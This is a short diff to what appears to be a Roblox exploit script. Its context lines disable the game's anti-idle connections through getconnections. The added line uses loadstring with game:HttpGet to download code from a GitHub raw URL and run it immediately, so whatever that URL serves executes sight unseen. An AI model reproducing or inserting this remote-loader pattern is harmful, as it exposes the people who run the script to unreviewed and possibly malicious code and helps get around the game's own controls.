@@ -118,3 +118,4 @@ for _, v in next, getconnections(game:GetService("Players").LocalPlayer.Idled) d
 
 v:Disable()
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VGB-VGB-VGB/Main/refs/heads/main/ScriptByVGB-Team"))()
